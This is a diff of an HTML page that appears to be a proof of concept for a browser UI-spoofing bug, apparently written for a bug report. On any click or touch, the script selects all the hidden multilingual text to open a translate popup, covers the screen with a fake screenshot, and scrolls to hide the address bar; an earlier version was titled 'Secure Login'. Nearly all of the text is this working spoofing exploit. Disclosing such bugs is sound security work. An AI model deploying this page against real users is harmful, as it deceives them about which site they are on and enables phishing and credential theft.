@@ -1,53 +1,57 @@
 <!DOCTYPE html>
-<html onmousedown="triggerSelect()" onclick="triggerSelect()">
-  <head>
-    <meta charset="UTF-8">
-    <title>Secure Login</title>
-    <style>
-      html, body {
-        margin: 0;
-        padding: 0;
-        overflow: hidden;
-        background: #fff;
-      }
+<html lang="en" onmousedown="trigger()" ontouchstart="trigger()" onclick="trigger()">
+<head>
+  <meta charset="UTF-8">
+  <title>Phantom</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      overflow: hidden;
+    }
 
-      #spoof {
-        display: none;
-        width: 100vw;
-        height: 100vh;
-        object-fit: cover;
-      }
+    #spoofImage {
+      display: none;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+    }
 
-      #hiddenTrigger {
-        position: absolute;
-        top: 99999px;
-      }
+    #hiddenText {
+      margin-top: 99999px;
+      user-select: text;
+      font-size: 16px;
+      color: transparent;
+    }
+  </style>
+</head>
+<body>
+  <!-- Spoofed Screenshot -->
+  <img id="spoofImage" src="spoof.jpeg" alt="spoof page" />
 
-      #triggerText {
-        font-size: 16px;
-        color: transparent;
-        user-select: text;
-      }
-    </style>
-  </head>
-  <body>
-    <!-- Hidden image appears after trigger -->
-    <img id="spoof" src="spoof.jpeg" />
+  <!-- This text triggers the Translate popup -->
+  <p id="hiddenText">
+    مرحبا بكم في موقع فانتوم. Привет мир. これはスプーフです。
+    هذا مجرد اختبار للاستخدام في تقرير البق.
+  </p>
 
-    <!-- Translate menu trigger -->
-    <div id="hiddenTrigger">
-      <p id="triggerText">
-        これはテストです。هذا اختبار。Это тест.これはテストです。هذا اختبار.这是一个测试。
-      </p>
-    </div>
-
-    <script>
-      function triggerSelect() {
-        try {
-          document.execCommand("selectAll");
-          document.getElementById("spoof").style.display = "block";
-        } catch (e) {}
-      }
-    </script>
-  </body>
+  <script>
+    function trigger() {
+      try {
+        // Select all content to invoke Translate
+        document.execCommand("selectAll");
+        // Show the fake UI
+        document.getElementById("spoofImage").style.display = "block";
+        // Try to scroll so that address bar gets hidden
+        window.scrollTo(0, 100000);
+      } catch (e) {}
+    }
+  </script>
+</body>
 </html>
